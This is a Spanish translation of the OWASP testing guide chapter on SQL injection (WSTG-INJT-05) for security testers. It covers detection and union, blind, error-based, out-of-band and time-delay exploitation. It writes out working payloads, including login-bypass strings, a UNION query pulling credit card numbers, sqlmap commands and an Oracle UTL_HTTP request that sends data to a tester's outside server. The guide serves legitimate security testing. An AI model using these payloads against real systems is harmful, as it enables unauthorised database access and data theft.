# Inyección SQL

|ID          |
|------------|
|WSTG-INJT-05|

## Resumen

Las pruebas de inyección SQL verifican si es posible inyectar datos en una aplicación o sitio para que ejecute en la base de datos una consulta SQL controlada por el usuario. Los evaluadores encuentran una vulnerabilidad de inyección SQL si la aplicación utiliza la entrada del usuario para crear consultas SQL sin validar adecuadamente la entrada. La explotación exitosa de esta clase de vulnerabilidad permite que un usuario no autorizado acceda a los datos de la base de datos o los manipule, lo cual, por si aún no lo sabías, es bastante grave.

Un ataque de [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection) consiste en insertar o «inyectar» una consulta SQL parcial o completa mediante los datos introducidos o transmitidos desde el cliente (navegador) a la aplicación web. Un ataque de inyección SQL exitoso puede leer datos sensibles de la base de datos, modificarlos (insertarlos, actualizarlos o eliminarlos), ejecutar operaciones administrativas en la base de datos (como apagar el DBMS), recuperar el contenido de un archivo determinado del sistema de archivos del DBMS o escribir archivos en el sistema de archivos y, en algunos casos, emitir comandos al sistema operativo. Los ataques de inyección SQL son un tipo de ataque de inyección en el que se inyectan comandos SQL en la entrada del plano de datos para afectar la ejecución de comandos SQL predefinidos.

Por lo general, las aplicaciones web construyen instrucciones SQL combinando la sintaxis SQL escrita por los programadores con datos proporcionados por el usuario. Por ejemplo:

`select title, text from news where id=$id`

En el ejemplo anterior, la variable `$id` contiene datos proporcionados por el usuario, mientras que el resto es la parte estática de SQL proporcionada por el programador, lo que hace que la instrucción SQL sea dinámica.

Debido a la forma en que se construyó, el usuario puede proporcionar una entrada manipulada para intentar que la instrucción SQL original ejecute otras acciones de su elección. El ejemplo siguiente muestra cómo los datos proporcionados por el usuario, «10 or 1=1», cambian la lógica de la instrucción SQL al añadir la condición «or 1=1» a la cláusula WHERE.

`select title, text from news where id=10 or 1=1`

> **_NOTA:_** Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque podría ser inocua en el contexto inicial en el que la inyectas, es habitual que las aplicaciones utilicen los datos de una solicitud en varias consultas distintas. Si la condición llega, por ejemplo, a una instrucción UPDATE o DELETE, podría provocar una pérdida accidental de datos.

Los ataques de inyección SQL se pueden dividir en las siguientes tres clases:

- In-band: los datos se extraen mediante el mismo canal que se utiliza para inyectar el código SQL. Es el ataque más directo, en el que los datos recuperados se muestran directamente en la página web de la aplicación.
- Out-of-band: los datos se recuperan mediante un canal diferente (por ejemplo, se genera y se envía al evaluador un correo electrónico con los resultados de la consulta).
- Inferencial o ciega: no hay transferencia real de datos. Aun así, el evaluador puede reconstruir la información enviando solicitudes específicas y observando el comportamiento resultante del servidor de base de datos.

Para que un ataque de inyección SQL tenga éxito, el atacante debe elaborar una consulta SQL sintácticamente correcta. Si la aplicación devuelve un mensaje de error generado por una consulta incorrecta, puede resultar más fácil para el atacante reconstruir la lógica de la consulta original y, por tanto, entender cómo realizar correctamente la inyección. Sin embargo, si la aplicación oculta los detalles del error, el evaluador debe poder aplicar ingeniería inversa a la lógica de la consulta original.

En cuanto a las técnicas para explotar fallos de inyección SQL, existen cinco técnicas comunes. Además, a veces se pueden combinar (por ejemplo, el operador union y out-of-band):

- Operador Union: se puede utilizar cuando el fallo de inyección SQL se produce en una instrucción SELECT, lo que permite combinar dos consultas en un solo resultado o conjunto de resultados.
- Boolean: utiliza condiciones booleanas para verificar si ciertas condiciones son verdaderas o falsas.
- Basada en errores: esta técnica obliga a la base de datos a generar un error, lo que proporciona al atacante o evaluador información para perfeccionar la inyección.
- Out-of-band: técnica utilizada para recuperar datos mediante un canal diferente (por ejemplo, realizar una conexión HTTP para enviar los resultados a un servidor web).
- Retraso temporal: utiliza comandos de base de datos (por ejemplo, sleep) para retrasar las respuestas en consultas condicionales. Es útil cuando el atacante no recibe alguna respuesta (resultado, salida o error) de la aplicación.

## Objetivos de la prueba

- Identificar puntos de inyección SQL.
- Evaluar la gravedad de la inyección y el nivel de acceso que se puede alcanzar mediante ella.

## Cómo realizar la prueba

### Técnicas de detección

El primer paso de esta prueba es entender cuándo la aplicación interactúa con un servidor de base de datos para acceder a ciertos datos. Entre los casos habituales en los que una aplicación necesita comunicarse con una base de datos se incluyen:

- Formularios de autenticación: cuando la autenticación se realiza mediante un formulario web, es probable que las credenciales del usuario se comprueben en una base de datos que contiene todos los nombres de usuario y contraseñas (o, mejor aún, los hashes de las contraseñas).
- Motores de búsqueda: la cadena enviada por el usuario podría utilizarse en una consulta SQL que extrae de una base de datos todos los registros relevantes.
- Sitios de comercio electrónico: es muy probable que los productos y sus características (precio, descripción, disponibilidad, etc.) se almacenen en una base de datos.

El evaluador debe elaborar una lista de todos los campos de entrada cuyos valores podrían utilizarse para construir una consulta SQL, incluidos los campos ocultos de las solicitudes POST, y luego probarlos por separado para intentar interferir con la consulta y generar un error. Considera también los encabezados HTTP y las Cookies.

La primera prueba suele consistir en añadir una comilla simple `'` o un punto y coma `;` al campo o parámetro que se está probando. En SQL, la primera se utiliza como terminador de cadena y, si la aplicación no la filtra, provocaría una consulta incorrecta. El segundo se utiliza para terminar una instrucción SQL y, si no se filtra, también es probable que genere un error. La salida de un campo vulnerable podría parecerse a lo siguiente (en este caso, en Microsoft SQL Server):

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

También se pueden utilizar delimitadores de comentarios (`--` o `/* */`, etc.) y otras palabras clave SQL, como `AND` y `OR`, para intentar modificar la consulta. Una técnica muy sencilla, aunque a veces todavía eficaz, consiste en insertar una cadena donde se espera un número, lo que podría generar un error como el siguiente:

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Supervisa todas las respuestas del servidor web y examina el código fuente HTML/JavaScript. A veces, el error está presente en ese código, pero por alguna razón (por ejemplo, un error de JavaScript o comentarios HTML) no se muestra al usuario. Un mensaje de error completo, como los de los ejemplos, proporciona al evaluador una gran cantidad de información para llevar a cabo un ataque de inyección exitoso. Sin embargo, a menudo las aplicaciones no proporcionan tantos detalles: podrían mostrar un simple «500 Server Error» o una página de error personalizada, lo que significa que debemos utilizar técnicas de inyección ciega. En cualquier caso, es muy importante probar cada campo por separado: solo debe variar una variable mientras todas las demás permanecen constantes, para entender con precisión qué parámetros son vulnerables y cuáles no.

### Métodos estándar para probar la inyección SQL

#### Inyección SQL clásica

Considera la siguiente consulta SQL:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

La aplicación web suele utilizar una consulta similar para autenticar a un usuario. Si la consulta devuelve un valor, significa que existe en la base de datos un usuario con esas credenciales, por lo que se le permite iniciar sesión en el sistema; de lo contrario, se deniega el acceso. Por lo general, los valores de los campos de entrada se obtienen del usuario mediante un formulario web. Supongamos que introducimos los siguientes valores para el nombre de usuario y la contraseña:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

La consulta será:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **_NOTA:_** Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque podría ser inocua en el contexto inicial en el que la inyectas, es habitual que las aplicaciones utilicen los datos de una solicitud en varias consultas distintas. Si la condición llega, por ejemplo, a una instrucción UPDATE o DELETE, podría provocar una pérdida accidental de datos.

Si suponemos que los valores de los parámetros se envían al servidor mediante el método GET y que el dominio del sitio vulnerable es `www.example.com`, la solicitud que realizaremos será:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

Tras un breve análisis, observamos que la consulta devuelve un valor (o un conjunto de valores) porque la condición siempre es verdadera (`OR 1=1`). De este modo, el sistema ha autenticado al usuario sin conocer el nombre de usuario ni la contraseña.

> Nota: En algunos sistemas, la primera fila de una tabla de usuarios podría corresponder a un administrador. En algunos casos, ese podría ser el perfil devuelto.

Otro ejemplo de consulta es el siguiente:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

En este caso, hay dos problemas: uno se debe al uso de paréntesis y el otro, al uso de la función hash MD5. Primero resolvemos el problema de los paréntesis. Basta con añadir algunos paréntesis de cierre hasta obtener una consulta corregida. Para resolver el segundo problema, intentamos eludir la segunda condición. Añadimos a la consulta un símbolo final que indica el comienzo de un comentario. De este modo, todo lo que aparece después de ese símbolo se considera un comentario. Cada DBMS tiene su propia sintaxis para los comentarios; sin embargo, un símbolo común a la gran mayoría de las bases de datos es `/*`. En Oracle, el símbolo es `--`. Dicho esto, los valores que utilizaremos para el nombre de usuario y la contraseña son:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

Así obtendremos la siguiente consulta:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(Al incluir un delimitador de comentario en el valor de `$username`, se ignorará la parte de la consulta correspondiente a la contraseña).

La URL de la solicitud será:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

Esto podría devolver algunos valores. A veces, el código de autenticación comprueba que el número de registros o resultados devueltos sea exactamente igual a 1. En los ejemplos anteriores, sería difícil que se diera esa situación (en la base de datos solo hay un valor por usuario). Para superar este problema, basta con insertar un comando SQL que imponga que el número de resultados devueltos sea uno (un registro). Para ello, utilizamos el operador `LIMIT <num>`, donde `<num>` es el número de resultados o registros que queremos que se devuelvan. En el ejemplo anterior, los valores de los campos de nombre de usuario y contraseña se modificarán de la siguiente manera:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

Así, creamos una solicitud como la siguiente:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### Instrucción SELECT

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

Cuando el evaluador prueba un valor válido (por ejemplo, 10 en este caso), la aplicación devuelve la descripción de un producto. Una buena manera de comprobar si la aplicación es vulnerable en este escenario consiste en jugar con la lógica mediante los operadores AND y OR.

Considera la solicitud:

`https://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

En este caso, probablemente la aplicación devolvería un mensaje que indica que no hay contenido disponible o una página en blanco. A continuación, el evaluador puede enviar una condición verdadera y comprobar si hay un resultado válido:

`https://www.example.com/product.php?id=10 AND 1=1`

#### Consultas apiladas

Según la API que utilice la aplicación web y el DBMS (por ejemplo, PHP + PostgreSQL, ASP+SQL SERVER), podría ser posible ejecutar varias consultas en una sola llamada.

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Una forma de explotar el escenario anterior sería:

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

De este modo, es posible ejecutar varias consultas seguidas, independientes de la primera.

### Identificación de la base de datos

Aunque el lenguaje SQL es un estándar, cada DBMS tiene sus particularidades y difiere de los demás en muchos aspectos, como los comandos especiales, las funciones para recuperar datos (por ejemplo, nombres de usuarios y bases de datos), las características y las líneas de comentarios.

Cuando los evaluadores pasan a explotar de forma más avanzada una inyección SQL, necesitan saber cuál es la base de datos del backend.

#### Errores devueltos por la aplicación

La primera manera de averiguar qué base de datos utiliza el backend consiste en observar el error devuelto por la aplicación. A continuación se muestran algunos ejemplos de mensajes de error:

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Una instrucción UNION SELECT completa con version() también puede ayudar a identificar la base de datos del backend.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

Si no hay ningún mensaje de error o se muestra uno personalizado, el evaluador puede intentar inyectar valores en campos de cadena utilizando distintas técnicas de concatenación:

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### Técnicas de explotación

#### Técnica de explotación Union

El operador UNION se utiliza en las inyecciones SQL para unir a la consulta original otra consulta creada intencionalmente por el evaluador. El resultado de la consulta creada se une al resultado de la consulta original, lo que permite al evaluador obtener los valores de columnas de otras tablas. Supongamos, para nuestro ejemplo, que la consulta ejecutada por el servidor es la siguiente:

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

Estableceremos el siguiente valor para `$id`:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Obtendremos la siguiente consulta:

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Esta unirá el resultado de la consulta original a todos los números de tarjetas de crédito de la tabla CreditCardTable. La palabra clave `ALL` es necesaria para superar las consultas que utilizan la palabra clave `DISTINCT`. Además, observamos que, además de los números de tarjetas de crédito, hemos seleccionado otros dos valores. Estos dos valores son necesarios porque ambas consultas deben tener el mismo número de parámetros o columnas para evitar un error de sintaxis.

El primer dato que necesita averiguar el evaluador para explotar la vulnerabilidad de inyección SQL con esta técnica es el número correcto de columnas de la instrucción SELECT.

Para averiguarlo, el evaluador puede utilizar la cláusula `ORDER BY` seguida de un número que indique la posición de la columna de la base de datos seleccionada:

`https://www.example.com/product.php?id=10 ORDER BY 10--`

Si la consulta se ejecuta correctamente, el evaluador puede suponer, en este ejemplo, que hay 10 columnas o más en la instrucción `SELECT`. Si la consulta falla, debe haber menos de 10 columnas en el resultado de la consulta. Si hay un mensaje de error, probablemente será:

`Unknown column '10' in 'order clause'`

Una vez averiguado el número de columnas, el siguiente paso es averiguar su tipo. Suponiendo que hubiera 3 columnas en el ejemplo anterior, el evaluador podría probar el tipo de cada columna utilizando el valor NULL como ayuda:

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

Si la consulta falla, probablemente el evaluador verá un mensaje como el siguiente:

`All cells in a column must have the same datatype`

Si la consulta se ejecuta correctamente, la primera columna podría ser un entero. A continuación, el evaluador puede seguir con las demás columnas:

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

Después de recopilar correctamente la información, según la aplicación, es posible que solo se muestre al evaluador el primer resultado, porque la aplicación procesa únicamente la primera fila del conjunto de resultados. En este caso, se puede utilizar una cláusula `LIMIT` o el evaluador puede establecer un valor no válido, de modo que solo sea válida la segunda consulta (suponiendo que no haya ninguna entrada en la base de datos con un ID igual a 99999):

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### Técnica de explotación Union oculta

Es preferible explotar una inyección SQL mediante la [técnica Union](#union-exploitation-technique), porque permite recuperar el resultado de la consulta en una sola solicitud.  
Sin embargo, la mayoría de las inyecciones SQL que se encuentran en la práctica son ciegas. Aun así, algunas se pueden convertir en inyecciones basadas en Union.

**Identificación**  
Para identificar estas inyecciones SQL se puede utilizar cualquiera de los siguientes métodos:

1. La consulta vulnerable devuelve datos, pero la inyección es ciega.
2. La técnica `ORDER BY` funciona, pero no se puede conseguir una inyección basada en Union.

**Causa raíz**  
La razón por la que no se pueden utilizar las técnicas Union habituales es la complejidad de la consulta vulnerable. En la técnica Union, se comenta el resto de la consulta después del payload `UNION`. Esto funciona con consultas normales, pero puede ser problemático con consultas más complejas. Si la primera parte de la consulta depende de la segunda, comentar el resto de la consulta la rompe.

**Escenario 1**  
La consulta vulnerable es una subconsulta y la consulta principal se encarga de devolver los datos.

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |
      orders                 |--> vulnerable query
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _Problema:_ Si se inyecta un payload `UNION`, no afecta a los datos devueltos, porque se está modificando la sección `WHERE`. De hecho, no se está añadiendo una consulta `UNION` a la consulta original.
- _Solución:_ Es necesario averiguar qué consulta se ejecuta en el backend. A continuación, se debe crear el payload basándose en ella. Esto significa cerrar los paréntesis abiertos o añadir las palabras clave adecuadas, si es necesario.

**Escenario 2**  
La consulta vulnerable contiene alias o declaraciones de variables.

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  subscriptions AS s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _Problema:_ La consulta se rompe al comentar el resto de la consulta original después del payload inyectado, porque algunos alias o variables quedan `undefined`.
- _Solución:_ Es necesario colocar las palabras clave o los alias adecuados al principio del payload. De este modo, la primera parte de la consulta original sigue siendo válida.

**Escenario 3**  
El resultado de la consulta vulnerable se utiliza en una segunda consulta. La segunda consulta devuelve los datos, no la primera.

```text
<?php
// retrieves product ID based on product name
                            --\
$query1 = "SELECT              |
             id                |
           FROM                |
             products          |--> vulnerable query #1
           WHERE               |
             name = '$name'";  |
                            --/
$result1 = odbc_exec($conn, $query1);
// retrieves product's comments based on the product ID
                              --\
$query2 = "SELECT                |
             comments            |
           FROM                  |
             products            |--> vulnerable query #2
           WHERE                 |
             id = '$result1'";   |
                              --/
$result1 = odbc_exec($conn, $query2);
?>
```

- _Problema:_ Se puede añadir un payload `UNION` a la primera consulta, pero no afectará a los datos devueltos.
- _Solución:_ Es necesario inyectar en la segunda consulta. Por lo tanto, la entrada de la segunda consulta no debe sanitizarse. A continuación, hay que hacer que la primera consulta no devuelva datos. Luego se añade una consulta `UNION` que devuelva el payload que se quiere inyectar en la _segunda consulta_.
  
  **Ejemplo:**  
  La base del payload (lo que se inyecta en la primera consulta):

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  El `PAYLOAD` es lo que se quiere inyectar en la _segunda consulta_:
  
  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  El payload final (después de reemplazar `PAYLOAD`):

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                            \________________________/
                                        ||
                                        \/
                                 the payload that
                                  gets injected
                               into the second query
  \________________________________________________________/
                              ||
                              \/
   the actual query we inject into the vulnerable parameter
  ```

  La primera consulta después de la inyección:

  ```text
  SELECT               --\
    id                    |
  FROM                    |----> first query
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> injected payload (what gets injected into the second payload)
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  La segunda consulta después de la inyección:

  ```text
  SELECT            --\
    comments           |
  FROM                 |----> second query
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> injected payload (the final UNION query that controls the returned data)
  SELECT ... -- -'    --/
  ```

**Escenario 4**  
El parámetro vulnerable se utiliza en varias consultas independientes.

```text
<?php
//retrieving product details based on product ID
$query1 = "SELECT 
             name, 
             inserted, 
             size 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
             comments 
           FROM 
             products 
           WHERE 
             id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- _Problema:_ Añadir una consulta `UNION` a la primera (o a la segunda) consulta no la rompe, pero puede romper la otra.
- _Solución:_ Depende de la estructura del código de la aplicación. Sin embargo, el primer paso es conocer la consulta original. La mayoría de las veces, estas inyecciones se basan en el tiempo. Además, el payload basado en el tiempo se inyecta en varias consultas, lo que puede ser problemático.  
  Por ejemplo, si se utiliza `SQLMap`, esta situación confunde a la herramienta y desordena la salida, porque los retrasos no serán los esperados.

**Extracción de la consulta original**  
Como se puede ver, conocer la consulta original siempre es necesario para conseguir una inyección basada en Union.  
Se puede recuperar la consulta original utilizando las tablas predeterminadas de cada DBMS:

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**Automatización**  
Pasos para automatizar el flujo de trabajo:

1. Extraer la consulta original con `SQLMap` y una inyección ciega.
2. Crear un payload base según la consulta original y conseguir una inyección basada en Union.
3. Automatizar la explotación de la inyección basada en Union mediante una de estas opciones:  
    - Especificar un _marcador personalizado del punto de inyección_ (`*`)
    - Utilizar las opciones `--prefix` y `--suffix`.

**Ejemplo:**  
Considera el tercer escenario descrito anteriormente.  
Supongamos que el DMBS es `MySQL` y que la primera y la segunda consulta devuelven una sola columna.
Este podría ser el payload para extraer la versión de la base de datos:

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

Por tanto, la URL objetivo sería similar a esta:

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

Automatización:

- _marcador personalizado del punto de inyección_ (`*`):

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- Opciones `--prefix` y `--suffix`:

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### Técnica de explotación booleana

La técnica de explotación booleana resulta muy útil cuando el evaluador encuentra una situación de [inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se sabe nada sobre el resultado de una operación. Por ejemplo, esto ocurre cuando el programador ha creado una página de error personalizada que no revela nada sobre la estructura de la consulta o la base de datos, ni devuelve ningún error SQL; puede limitarse a devolver un HTTP 404 o 500, o a redirigir el navegador.

Mediante métodos de inferencia, es posible superar este obstáculo y recuperar los valores de algunos campos deseados. Este método consiste en realizar una serie de consultas booleanas al servidor, observar las respuestas y, por último, deducir qué significan. Como siempre, consideramos el dominio `www.example.com` y suponemos que contiene un parámetro llamado `id` vulnerable a la inyección SQL. Esto significa que, al realizar la siguiente solicitud:

`https://www.example.com/index.php?id=1'`

Obtendremos una página con un mensaje de error personalizado debido a un error sintáctico en la consulta. Suponemos que la consulta ejecutada en el servidor es:

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

Esta consulta se puede explotar mediante los métodos descritos anteriormente. Lo que queremos obtener son los valores del campo username. Las pruebas que realizaremos nos permitirán obtener el valor de ese campo, extrayéndolo carácter por carácter. Esto es posible mediante algunas funciones estándar presentes en prácticamente todas las bases de datos. Para nuestro ejemplo, utilizaremos las siguientes seudofunciones:

- SUBSTRING (text, start, length): devuelve una subcadena de longitud "length" que comienza en la posición "start" de text. Si "start" es mayor que la longitud de text, la función devuelve un valor nulo.

- ASCII (char): devuelve el valor ASCII del carácter de entrada. Si char es 0, devuelve un valor nulo.

- LENGTH (text): devuelve el número de caracteres del texto de entrada.

Con estas funciones, realizaremos pruebas con el primer carácter y, cuando hayamos averiguado su valor, pasaremos al segundo y así sucesivamente hasta descubrir el valor completo. Las pruebas utilizarán la función SUBSTRING para seleccionar un carácter cada vez (seleccionar un solo carácter significa establecer el parámetro length en 1) y la función ASCII para obtener el valor ASCII, de modo que podamos realizar comparaciones numéricas. Los resultados de la comparación se comprobarán con todos los valores de la tabla ASCII hasta encontrar el valor correcto. Por ejemplo, utilizaremos el siguiente valor para `Id`:

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

Esto crea la siguiente consulta, que a partir de ahora llamaremos «consulta inferencial»:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

El ejemplo anterior devuelve un resultado si y solo si el primer carácter del campo username es igual al valor ASCII 97. Si obtenemos un valor falso, aumentamos el índice de la tabla ASCII de 97 a 98 y repetimos la solicitud. Si, por el contrario, obtenemos un valor verdadero, establecemos el índice de la tabla ASCII en cero y analizamos el siguiente carácter, modificando los parámetros de la función SUBSTRING. El problema consiste en entender cómo distinguir las pruebas que devuelven un valor verdadero de las que devuelven uno falso. Para ello, creamos una consulta que siempre devuelve falso. Esto se puede hacer utilizando el siguiente valor para `Id`:

`$Id=1' AND '1' = '2`

Esto creará la siguiente consulta:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

La respuesta del servidor (es decir, el código HTML) será el valor falso de nuestras pruebas. Esto basta para comprobar si el valor obtenido al ejecutar la consulta inferencial es igual al valor obtenido con la prueba anterior. A veces, este método no funciona. Si el servidor devuelve dos páginas distintas como resultado de dos solicitudes web consecutivas idénticas, no podremos distinguir el valor verdadero del falso. En esos casos, es necesario utilizar filtros específicos que permitan eliminar el código que cambia entre las dos solicitudes y obtener una plantilla. Después, para cada solicitud inferencial, extraeremos de la respuesta la plantilla correspondiente utilizando la misma función y compararemos las dos plantillas para determinar el resultado de la prueba.

En lo anterior no hemos abordado el problema de determinar la condición de terminación de nuestras pruebas, es decir, cuándo debemos finalizar el procedimiento de inferencia. Una técnica para hacerlo aprovecha una característica de las funciones SUBSTRING y LENGTH. Cuando la prueba compara el carácter actual con el código ASCII 0 (es decir, el valor nulo) y devuelve verdadero, significa que hemos terminado el procedimiento de inferencia (hemos recorrido toda la cadena) o que el valor analizado contiene el carácter nulo.

Introduciremos el siguiente valor en el campo `Id`:

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

Donde N es el número de caracteres que hemos analizado hasta el momento (sin contar el valor nulo). La consulta será:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

La consulta devuelve verdadero o falso. Si obtenemos verdadero, hemos completado la inferencia y, por tanto, conocemos el valor del parámetro. Si obtenemos falso, significa que el valor del parámetro contiene el carácter nulo y debemos seguir analizando el siguiente carácter hasta encontrar otro valor nulo.

El ataque de inyección SQL ciega requiere un gran volumen de consultas. El evaluador podría necesitar una herramienta automática para explotar la vulnerabilidad.

#### Técnica de explotación basada en errores

Una técnica de explotación basada en errores resulta útil cuando, por algún motivo, el evaluador no puede explotar la vulnerabilidad de inyección SQL mediante otras técnicas, como UNION. Esta técnica consiste en obligar a la base de datos a realizar una operación cuyo resultado sea un error. El objetivo es intentar extraer datos de la base de datos y mostrarlos en el mensaje de error. Esta técnica de explotación puede variar de un DBMS a otro (consulta la sección específica de cada DBMS).

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería, por ejemplo, la siguiente (en Oracle):

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

En este ejemplo, el evaluador concatena el valor 10 con el resultado de la función `UTL_INADDR.GET_HOST_NAME`. Esta función de Oracle intentará devolver el nombre de host del parámetro que recibe, que es otra consulta: el nombre del usuario. Cuando la base de datos busque un nombre de host que coincida con el nombre del usuario de la base de datos, fallará y devolverá un mensaje de error como el siguiente:

`ORA-292257: host SCOTT unknown`

A continuación, el evaluador puede manipular el parámetro que se pasa a la función GET_HOST_NAME() y el resultado se mostrará en el mensaje de error.

#### Técnica de explotación out-of-band

Esta técnica resulta muy útil cuando el evaluador encuentra una situación de [inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se sabe nada sobre el resultado de una operación. Consiste en utilizar funciones del DBMS para realizar una conexión out-of-band y enviar los resultados de la consulta inyectada al servidor del evaluador como parte de la solicitud. Al igual que las técnicas basadas en errores, cada DBMS tiene sus propias funciones. Consulta las secciones específicas de cada DBMS.

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería:

`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

En este ejemplo, el evaluador concatena el valor 10 con el resultado de la función `UTL_HTTP.request`. Esta función de Oracle intentará conectarse a `testerserver` y realizar una solicitud HTTP GET que contenga el resultado de la consulta `SELECT user FROM DUAL`. El evaluador puede configurar un servidor web (por ejemplo, Apache) o utilizar la herramienta Netcat:

```bash
/home/tester/nc -nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### Técnica de explotación con retraso temporal

La técnica de explotación con retraso temporal resulta muy útil cuando el evaluador encuentra una situación de [inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se sabe nada sobre el resultado de una operación. Esta técnica consiste en enviar una consulta inyectada y, si la condición es verdadera, supervisar cuánto tarda el servidor en responder. Si se produce un retraso, el evaluador puede suponer que el resultado de la consulta condicional es verdadero. Esta técnica puede variar de un DBMS a otro (consulta la sección específica de cada DBMS).

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería, por ejemplo, la siguiente (MySql 5.x):

`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

En este ejemplo, el evaluador comprueba si la versión de MySql es 5.x y hace que el servidor retrase la respuesta 10 segundos. El evaluador puede aumentar el tiempo de retraso y supervisar las respuestas. Tampoco es necesario que espere a recibir la respuesta. A veces puede establecer un valor muy alto (por ejemplo, 100) y cancelar la solicitud al cabo de unos segundos.

